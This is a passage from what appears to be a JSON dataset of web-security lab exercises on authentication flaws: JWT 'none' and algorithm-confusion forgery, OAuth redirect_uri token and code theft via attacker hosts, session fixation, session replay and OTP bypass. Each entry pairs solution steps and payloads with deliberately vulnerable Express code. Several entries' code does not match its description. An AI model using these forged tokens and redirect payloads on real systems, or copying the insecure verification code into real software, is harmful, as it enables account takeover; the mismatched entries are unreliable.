    "Lab Description": "This application uses JWTs to authenticate users for a GraphQL endpoint. The JWT validation accepts tokens with the 'none' algorithm when no signature is provided. To solve: Forge a token with 'none' algorithm and gain access to Carlos’s account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to login with valid credentials and observe the Authorization Bearer token format returned from GraphQL /auth endpoint.",
      "Decode the JWT using jwt.io and note that it uses RS256 algorithm.",
      "Manually forge a new JWT token with header { \"alg\": \"none\", \"typ\": \"JWT\" } and payload { \"username\": \"carlos\" }.",
      "Use the unsigned token in the Authorization header to call a protected GraphQL query (e.g., getAccountData).",
      "Observe successful access to Carlos's account info in the response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: 'securepassword' }; const pubKey = 'PUBLIC_KEY_PLACEHOLDER'; app.post('/auth', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, pubKey, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const user = jwt.verify(token, pubKey, { algorithms: ['RS256', 'none'] }); if (user.username) return res.json({ data: 'Welcome back ' + user.username }); } catch { return res.status(403).json({ error: 'Access denied' }); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <unsigned-token>",
      "{ \"query\": \"{ getAccountData }\" }"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow open redirect with token leak",
    "Lab Description": "This app uses OAuth with the implicit grant type. The redirect_uri parameter is improperly validated, allowing token leakage via open redirect. To solve: Exploit the open redirect to capture an access token and impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate an OAuth login and intercept the /authorize request URL with response_type=token.",
      "Modify the redirect_uri parameter to redirect to your attacker-controlled server (e.g., https://evil.net/callback).",
      "Confirm the application accepts unvalidated domains via redirect_uri parameter.",
      "When Carlos logs in via your malicious link, his token will be sent to your server in the URI fragment.",
      "Extract the token from the request and use it in a Bearer header to access Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = { carlos: 'carlos-access-token-123' }; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri, username } = req.query; if (response_type === 'token' && users[username]) { const accessToken = users[username]; res.redirect(redirect_uri + '#access_token=' + accessToken); } else { res.status(400).send('Bad request'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Object.values(users).includes(token)) res.send('Private profile data for Carlos'); else res.status(403).send('Invalid token'); }); app.listen(5000);",
    "payloads": [
      "https://victim.com/authorize?response_type=token&client_id=123&redirect_uri=https://evil.net/callback&username=carlos",
      "Access token from URI fragment: access_token=carlos-access-token-123",
      "Authorization: Bearer carlos-access-token-123"
    ]
  },
  {
    "Lab scenario": "Session replay due to insecure session expiration logic in REST API",
    "Lab Description": "The application does not enforce session expiration correctly, allowing reuse of stale tokens within a brief timing window. It uses stateless session tokens with no revocation tracking. To solve: replay a previously valid session token to access Carlos's account after logout.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a successful login request and capture the session token in the Set-Cookie header.",
      "In Postman, validate the session token by using it in a GET /user/me request.",
      "Logout to invalidate the session, but quickly replay the token using a GET /account request.",
      "Use OWASP ZAP to fuzz the timing window by delaying requests incrementally and observing 200 OK responses.",
      "If the token is still accepted briefly after logout, access /account as carlos and confirm session hijack success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'test123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = Date.now() + '_' + Math.random().toString(36).substring(2); sessions[token] = { username, issued: Date.now() }; res.cookie('token', token); res.send('Logged in'); }); app.post('/logout', (req, res) => { const { token } = req.cookies; delete sessions[token]; res.send('Logged out'); }); app.get('/account', (req, res) => { const session = sessions[req.cookies.token]; if (session && (Date.now() - session.issued < 10000)) { return res.send('Account page for carlos'); } res.status(403).send('Access denied'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Replay Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Replay cookie token from Burp before it expires",
      "Delay logout by 5 seconds and send /account with same cookie",
      "GET /account with previous session token from proxy history"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass using 'none' algorithm in GraphQL API",
    "Lab Description": "The backend incorrectly accepts JWTs signed with the 'none' algorithm. The application uses JWTs to authorize GraphQL queries. To solve: forge a JWT to access Carlos's account profile by injecting a token with 'alg':'none'.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to log in and capture the Authorization: Bearer header from a GraphQL request.",
      "Decode the JWT using jwt.io and observe that the token is using HS256 and includes 'sub':'wiener'.",
      "Craft a new JWT manually with 'alg':'none' and 'sub':'carlos', omitting the signature.",
      "Use Postman to send a GraphQL query with forged JWT to query { me { username email } }.",
      "If the response includes carlos's email, access /account to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { wiener: 'wienerpass', carlos: 'carlospass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ sub: username }, 'supersecret', { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid'); }); app.post('/graphql', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, 'supersecret', { algorithms: ['HS256', 'none'] }); if (payload.sub === 'carlos') return res.send({ data: { username: 'carlos', email: 'carlos@corp.local' } }); } catch (e) { return res.status(403).send('Invalid token'); } res.send({ data: { username: 'unknown' } }); }); const PORT = 3002; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "JWT with header {\"alg\":\"none\"}, payload {\"sub\":\"carlos\"}, and no signature",
      "Authorization: Bearer <base64header>.<base64payload>.",
      "GraphQL query: { me { username email } } with forged JWT"
    ]
  },
  {
    "Lab scenario": "OAuth 2.0 code interception due to open redirect in callback endpoint",
    "Lab Description": "The application integrates with a third-party OAuth provider, but its redirect_uri parameter is vulnerable to open redirection. An attacker can intercept the authorization code and complete OAuth flow as another user. To solve: log in to Carlos's account via stolen OAuth token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth authorization flow and observe the redirect_uri parameter during redirection.",
      "Modify the redirect_uri to point to attacker.com/callback and send the victim to the modified link.",
      "On attacker.com, capture the code parameter sent by the OAuth provider.",
      "Use Postman to exchange the intercepted code for an access token using /oauth/token endpoint.",
      "Send the token to /me or /account to impersonate Carlos and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/callback', async (req, res) => { const { code, redirect_uri } = req.query; const tokenRes = await axios.post('https://oauth-provider/token', { code, redirect_uri }); const accessToken = tokenRes.data.access_token; res.send('Authenticated with token: ' + accessToken); }); app.get('/account', async (req, res) => { const { token } = req.query; const userRes = await axios.get('https://oauth-provider/userinfo', { headers: { Authorization: 'Bearer ' + token } }); if (userRes.data.email === 'carlos@corp.local') { return res.send('Account details for carlos'); } res.status(403).send('Access denied'); }); const PORT = 3003; app.listen(PORT, () => console.log(`OAuth Code Interception Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://auth.example.com/oauth/authorize?redirect_uri=https://attacker.com/callback",
      "POST /oauth/token with stolen code and correct client_id/client_secret",
      "GET /account?token=<stolen-access-token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via preserved session ID in OAuth callback",
    "Lab Description": "The application integrates OAuth for external login but incorrectly preserves session identifiers across the authorization process. The application allows the session ID set before the OAuth login to persist and bind to the authenticated session. To solve: Hijack Carlos's authenticated session by fixing a session ID and triggering OAuth login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to initiate a login via OAuth and intercept the GET /oauth/start request to observe the session cookie.",
      "2. Manually set a session cookie in your browser before login (e.g., sessionid=attacker123) and complete the OAuth login flow.",
      "3. Verify that the sessionid remains the same after completing login, confirming session fixation.",
      "4. Craft a phishing link using the fixed session ID and send it to the victim.",
      "5. When Carlos completes the OAuth login using your fixed session ID, use the same session ID to access his account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); const users = { 'carlos': { loggedIn: false } }; app.get('/oauth/start', (req, res) => { const redirectUri = 'http://localhost:4000/oauth/callback?sid=' + req.session.id; res.redirect(redirectUri); }); app.get('/oauth/callback', (req, res) => { const sid = req.query.sid; if (sid && users['carlos']) { req.session.id = sid; users['carlos'].loggedIn = true; res.send('OAuth login completed'); } else { res.status(403).send('Invalid callback'); } }); app.get('/account', (req, res) => { if (users['carlos'].loggedIn && req.session.id) { res.send('Carlos Account Access'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "http://lab.com/oauth/start (with sessionid=attacker123)",
      "http://lab.com/oauth/callback?sid=attacker123",
      "Session fixation attack link to victim"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in access token verification",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) to authorize access to admin functionality but improperly trusts the algorithm field in incoming tokens. The verification step trusts tokens with alg=none or switched signing algorithms. To solve: Forge a valid JWT granting admin access using algorithm confusion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to capture a request with a valid JWT in the Authorization header.",
      "2. Decode the JWT in jwt.io and observe the alg field and payload content.",
      "3. Modify the token to use 'alg':'none' and set 'role':'admin' in the payload.",
      "4. Re-encode the token without a signature and resend it using Burp Repeater.",
      "5. If the server accepts the unsigned token and grants admin access, verify by accessing the /admin/dashboard endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.role === 'admin') { res.send('Admin access granted'); } else { res.status(403).send('User not admin'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "{ \"alg\": \"none\", \"typ\": \"JWT\" }.{ \"username\": \"carlos\", \"role\": \"admin\" }.",
      "Authorization: Bearer <forged_unsigned_token>",
      "Modified JWT with role=admin and alg=none"
    ]
  },
  {
    "Lab scenario": "Bypassing MFA with misconfigured OTP verification logic",
    "Lab Description": "The application uses an OTP-based second factor of authentication but verifies only the presence—not validity—of the OTP. A user can bypass this step by submitting a malformed or missing value. To solve: Access Carlos's account page without knowing the valid OTP.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the POST /verify-otp request after login.",
      "2. Observe that the OTP field is submitted as a JSON parameter (e.g., {\"otp\":\"123456\"}).",
      "3. Modify the value to null or remove it entirely in Burp Repeater.",
      "4. Resend the request and observe if authentication is granted regardless of OTP value.",
      "5. Once bypassed, access the /my-account page for Carlos to confirm the exploit."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); sessions[username] = { otpRequired: true }; res.send('OTP sent'); }); app.post('/verify-otp', (req, res) => { const { username, otp } = req.body; if (sessions[username] && sessions[username].otpRequired) { sessions[username].otpRequired = false; res.send('OTP verification passed'); } else { res.status(400).send('Invalid session'); } }); app.get('/my-account', (req, res) => { res.send('Carlos account dashboard'); }); app.listen(4000);",
    "payloads": [
      "{ \"username\": \"carlos\", \"password\": \"letmein\" }",
      "{ \"username\": \"carlos\", \"otp\": null }",
      "{ \"username\": \"carlos\" }"
    ]
  },
  {
    "Lab scenario": "Session Fixation via token reuse vulnerability in login endpoint",
    "Lab Description": "The application's login logic accepts externally supplied session tokens, leading to a session fixation vulnerability. The application uses a cookie named `session` but does not regenerate it after login. To solve: Fixate a session for Carlos before he logs in, then use it to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the GET /login page request with Burp Suite and inject a custom session cookie (e.g., session=attacker123).",
      "Forward the login page request and send it to Carlos via social engineering or lure.",
      "Wait for Carlos to log in using the fixated session (session=attacker123).",
      "Replay any authenticated request (e.g., GET /dashboard) using the fixed session cookie after Carlos logs in.",
      "Access /my-account using the session cookie to confirm control over Carlos’s session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 's3cr3t' }]; const sessions = {}; app.get('/login', (req, res) => { const sessId = req.cookies.session || 'guest_' + Math.random(); res.cookie('session', sessId); res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.session] = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send('Account page of ' + user); } else { res.status(403).send('Not authenticated'); } }); app.listen(3000);",
    "payloads": [
      "Cookie: session=attacker123",
      "POST /login with session=attacker123 in request cookies",
      "GET /my-account with Cookie: session=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm vulnerability in authentication token validation logic",
    "Lab Description": "The REST API uses JWTs for user authentication, but fails to enforce proper signature verification. It improperly accepts tokens with the `alg` header set to `none`. To solve: Forge a valid-looking JWT token with `none` algorithm and impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a legitimate Authorization: Bearer JWT from your own login.",
      "Decode the JWT using jwt.io or jwt_tool to observe its structure.",
      "Craft a new token with header {\"alg\":\"none\"} and payload {\"username\":\"carlos\"}. Remove the signature part.",
      "Send a GET request to /api/profile using the forged JWT in the Authorization header.",
      "Confirm access to Carlos’s profile and capture the success message."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Unauthorized' }); const token = jwt.sign({ username }, 'secretkey'); res.json({ token }); }); app.get('/api/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { res.send('Welcome to carlos profile'); return; } try { jwt.verify(token, 'secretkey'); res.send('Welcome to profile'); } catch { res.status(403).send('Invalid token'); } }); app.listen(3001);",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Base64 Header: {\"alg\":\"none\"}",
      "Base64 Payload: {\"username\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in third-party authentication handler",
    "Lab Description": "The app implements OAuth 2.0 login via a third-party provider but does not validate the `redirect_uri` parameter. This allows an attacker to manipulate the flow and capture authorization codes. To solve: Hijack Carlos’s OAuth login flow to gain access to his session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a malicious OAuth login link with the `redirect_uri` parameter pointing to your server (e.g., https://attacker.com/callback).",
      "Lure Carlos into clicking it (via email or direct message).",
      "Capture the `code` parameter sent to your server when Carlos authorizes.",
      "Exchange the authorization code at the token endpoint using Postman or Burp Repeater.",
      "Use the obtained access token to call /oauth/profile and retrieve Carlos’s session info."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const qs = require('qs'); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; const data = qs.stringify({ code, redirect_uri, client_id: 'app123', client_secret: 'secret' }); try { const tokenRes = await axios.post('https://oauthprovider.com/token', data); const accessToken = tokenRes.data.access_token; // no validation of redirect_uri res.send('Logged in as Carlos using token: ' + accessToken); } catch { res.status(500).send('OAuth error'); } }); app.listen(3002);",
    "payloads": [
      "https://vulnerable-app.com/oauth/callback?redirect_uri=https://attacker.com/callback",
      "https://attacker.com/callback?code=AUTHCODE123",
      "POST /token with code=AUTHCODE123, redirect_uri=https://attacker.com/callback"
    ]
  },
  {
    "Lab scenario": "JWT Algorithm Confusion in Authorization Header",
  
    "Lab Description": "The application uses JWT tokens for session authentication but fails to verify the signing algorithm securely. The token is accepted even if the algorithm is changed to 'none'. The application embeds user roles inside JWTs and uses these to enforce access control. To solve: Access the /admin endpoint as an admin without valid credentials by manipulating the JWT header and payload.",
  
    "Difficulty Level": "Medium",
  
    "Solution Steps": [
      "Capture the login request using Burp Suite and extract the issued JWT from the Authorization header.",
      "Decode the JWT using jwt.io or Burp Decoder to inspect the header and payload contents.",
      "Replace the alg field in the JWT header with 'none' and modify the payload to set \"role\": \"admin\".",
      "Remove the signature part of the JWT and re-encode the token with only header and payload.",
      "Send a GET request to /admin with the modified JWT in the Authorization header to confirm access as admin."
    ],
  
    "Vulnerability name": "Authentication",
  
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET, { ignoreExpiration: true }); if (decoded.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access Denied'); } catch (err) { res.status(400).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass running on http://localhost:${PORT}`));",
  
    "payloads": [
      "{\"alg\":\"none\",\"typ\":\"JWT\"}",
      "{\"username\":\"carlos\",\"role\":\"admin\"}",
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "Session Fixation via Predictable Session ID in Cookie",
  
    "Lab Description": "The application assigns static session tokens based on usernames, which are reused on login and not regenerated after successful authentication. This allows an attacker to force a victim to use a known session ID. To solve: Fixate Carlos's session ID and gain access to his authenticated account without knowing his password.",
  
    "Difficulty Level": "Hard",
  
    "Solution Steps": [
      "Using OWASP ZAP or Burp Suite, observe that session IDs are set as user:<username> in cookies.",
      "Log in as your own account and confirm that the same session ID is reused on every login.",
      "Manually craft a session cookie with value session=user:carlos and deliver it to the victim using an XSS/CSRF simulation.",
      "Wait for Carlos to log in and claim the known session ID from your browser.",
      "Access /dashboard with the fixed session cookie and verify Carlos's account is exposed."
    ],
  
    "Vulnerability name": "Authentication",
  
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'carpass' }, { username: 'guest', password: 'guestpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('session', `user:${username}`); res.redirect('/dashboard'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const session = req.cookies.session; if (session === 'user:carlos') return res.send('Carlos dashboard content'); if (session) return res.send('User dashboard content'); res.status(401).send('No session'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab on http://localhost:${PORT}`));",
  
    "payloads": [
      "Cookie: session=user:carlos",
      "Force session ID via XSS or CSRF iframe injection",
      "Manually inject session into browser before login"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
  
    "Lab Description": "The application uses OAuth for login via a third-party provider but fails to enforce strict validation of the redirect URI. This allows attackers to intercept authorization codes by manipulating the redirect_uri parameter. To solve: Capture Carlos's authorization code and exchange it for an access token to access his profile.",
  
    "Difficulty Level": "Hard",
  
    "Solution Steps": [
      "Initiate an OAuth login flow and intercept the redirect to your registered redirect_uri using Burp Suite.",
      "Modify the redirect_uri parameter to an attacker-controlled domain while preserving domain prefix similarity.",
      "Send the OAuth link to the victim to trick them into authenticating and leaking the authorization code.",
      "Capture the authorization code in the attacker-controlled server log.",
      "Exchange the code with the /oauth/token endpoint and use the access_token to fetch Carlos's profile via /me endpoint."
    ],
  
    "Vulnerability name": "Authentication",
  
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const accessTokens = {}; const clients = [{ clientId: 'trusted-client', redirectUri: 'https://trusted.example.com/callback' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const validClient = clients.find(c => c.clientId === client_id); if (!validClient) return res.status(400).send('Unknown client'); authCodes['carlos'] = 'code123'; res.redirect(`${redirect_uri}?code=code123&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'code123') return res.json({ access_token: 'token-for-carlos' }); res.status(403).send('Invalid code'); }); app.get('/me', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') return res.send('Carlos profile data'); res.status(403).send('Access Denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
  
    "payloads": [
      "redirect_uri=https://attacker.example.com/callback",
      "GET /oauth/authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&state=xyz",
      "POST /oauth/token with code=code123",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in access control middleware",
    "Lab Description": "This lab contains a JWT implementation vulnerable to algorithm confusion. The application uses the 'alg' field from the token header without enforcing a fixed algorithm, allowing a switch from RS256 to HS256 with the public key as HMAC secret. To solve: Forge a JWT token to impersonate the admin user and access /admin/dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using Burp Suite, intercept a login request and extract the JWT issued after successful login.",
      "2.Decode the JWT using jwt.io or jwt_tool and observe the 'alg' field set to RS256.",
      "3.Fetch the public key from /.well-known/jwks.json endpoint (discovered via OWASP ZAP or proxy history).",
      "4.Use jwt_tool or Postman to forge a new token with 'alg' changed to HS256 and use the public key as the HMAC key.",
      "5.Modify the payload to { \"username\": \"admin\", \"role\": \"admin\" }, sign and encode the token.",
      "6.Send the forged token to /admin/dashboard in the Authorization header and verify admin access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const pubKey = fs.readFileSync('./public.pem'); const users = { 'carlos': 'userpass', 'admin': 'supersecret' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username: username, role: username === 'admin' ? 'admin' : 'user' }, fs.readFileSync('./private.pem'), { algorithm: 'RS256' }); return res.json({ token }); } res.status(403).send('Invalid login'); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.role === 'admin') return res.send('Welcome to the admin dashboard'); return res.status(403).send('Access denied'); } catch (e) { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
    "payloads": [
      "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"admin\", \"role\": \"admin\" }",
      "Sign using public key as HMAC secret",
      "Send forged token in Authorization: Bearer header"
    ]
  },
  {
    "Lab scenario": "Session fixation via login redirection token",
    "Lab Description": "This lab implements a redirection-based login flow where a session token is pre-assigned and reused across accounts. The session fixation vulnerability arises due to the application honoring the token provided in the URL even after successful login. To solve: Fix a session for Carlos and access /my-account as him.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.With Burp Suite, visit /login?token=randomvalue before authenticating.",
      "2.Capture the Set-Cookie response and observe the token is accepted and stored.",
      "3.Log in with your own credentials and verify the session remains the same from the earlier token.",
      "4.Log out and craft a link: /login?token=fixedtoken and send it to Carlos (simulate using replay).",
      "5.After Carlos logs in, reuse the fixedtoken cookie to access /my-account.",
      "6.Verify that Carlos's account data is accessible, proving session fixation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': 'superpass', 'attacker': 'attackerpass' }; const sessions = {}; app.get('/login', (req, res) => { const token = req.query.token || Math.random().toString(36).slice(2); res.cookie('session', token); sessions[token] = null; res.send(`<form method='POST' action='/login'><input name='username'/><input name='password'/><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const session = req.cookies.session; if (users[username] === password) { sessions[session] = username; return res.redirect('/my-account'); } res.send('Invalid login'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; const user = sessions[session]; if (user) return res.send(`Account page of ${user}`); res.send('Not logged in'); }); app.listen(4001, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "/login?token=fixedsessiontoken",
      "Set-Cookie: session=fixedsessiontoken",
      "Reuse session cookie after victim login",
      "GET /my-account with stolen fixed session"
    ]
  },
  {
    "Lab scenario": "OAuth authorization code leakage via Referer header",
    "Lab Description": "This lab is vulnerable due to improper handling of OAuth 2.0 authorization codes which can leak via the Referer header to third-party domains. The app does not validate the 'redirect_uri' domain properly, allowing attackers to steal codes. To solve: Leak the victim's code to your server and redeem it to access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use OWASP ZAP to analyze the OAuth flow. Observe the authorization code is passed via query parameters to the 'redirect_uri'.",
      "2.Register an attacker redirect_uri like https://attacker.site/callback that logs Referer headers.",
      "3.Trick Carlos into clicking a crafted OAuth login link with your attacker site as the redirect_uri.",
      "4.Receive the authorization code via your server's Referer logs.",
      "5.Use Postman to redeem the stolen code at /oauth/token and obtain an access token.",
      "6.Use the token to call /api/me and confirm account takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const crypto = require('crypto'); const qs = require('querystring'); app.use(express.urlencoded({ extended: true })); const codes = {}; const tokens = {}; const users = { 'carlos': { id: 1, name: 'Carlos' } }; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = crypto.randomBytes(4).toString('hex'); codes[code] = 'carlos'; const location = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(location); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; const user = codes[code]; if (!user) return res.status(400).send('Invalid code'); const token = crypto.randomBytes(8).toString('hex'); tokens[token] = user; res.json({ access_token: token }); }); app.get('/api/me', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (!user) return res.status(401).send('Unauthorized'); res.send(`Welcome ${users[user].name}`); }); app.listen(4002, () => console.log('OAuth Code Leak Lab running'));",
    "payloads": [
      "https://auth.lab/authorize?client_id=abc&redirect_uri=https://attacker.site/callback&state=xyz",
      "Capture code=abcd123 from Referer header on attacker.site",
      "POST /oauth/token with code=abcd123",
      "GET /api/me with Authorization: Bearer <token>"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm bypass in Authorization header",
    "Lab Description": "The application uses JWTs to manage user sessions but fails to validate the signature if the algorithm is set to 'none'. The JWT token is sent via the Authorization header in a Bearer scheme. To solve: Forge a valid admin JWT using the 'none' algorithm and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request after logging in with a normal user account. Locate the Authorization header containing the Bearer JWT.",
      "Send the JWT to jwt.io or decode it locally. Observe the header: {\"alg\": \"HS256\", \"typ\": \"JWT\"}.",
      "Change the alg value to 'none' and remove the signature part of the token.",
      "Modify the payload to {\"username\": \"admin\", \"role\": \"admin\"} and re-encode the JWT without a signature.",
      "Replace the Authorization header in a request to /admin-panel with the forged JWT and send the request. Confirm admin access."
    ],
    "Vulnerability name": "Authentication",
